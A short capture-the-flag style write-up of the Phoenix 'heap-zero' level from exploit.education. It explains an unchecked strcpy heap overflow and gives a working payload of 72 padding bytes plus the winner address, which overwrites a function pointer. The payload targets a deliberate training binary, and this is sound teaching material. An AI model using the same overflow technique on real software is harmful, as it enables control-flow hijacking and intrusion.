We will work with the **32bit** binaries for the heap levels because the **64bit** binaries have some addresses issues.

This code allocates two memory chunks and stores them in **d** and **f** so **f** is after **d** in the heap, then it uses **strcpy** to copy **argv[1]** to **d->name** but with out size checking, a classic overflow.

So if our input is large enough we can overwrite the value of **f->fp** to point to **winner** function.

Let's run the program:

```
$ /opt/phoenix/i486/heap-zero AAAA
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwritten
```

The offset between **data** and **fp** = 0xf7e69050 - 0xf7e69008 = 72 bytes.

Lets't get the address of winner function:

```
$ objdump -t /opt/phoenix/i486/heap-zero | grep winner
0804884e g     F .text	00000019 nowinner
08048835 g     F .text	00000019 winner
```

**winner** function is at  **0x08048835**.

# Solution:

```
$ /opt/phoenix/i486/heap-zero $(python -c "print 'A'*72 + '\x35\x88\x04\x08'")
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
```
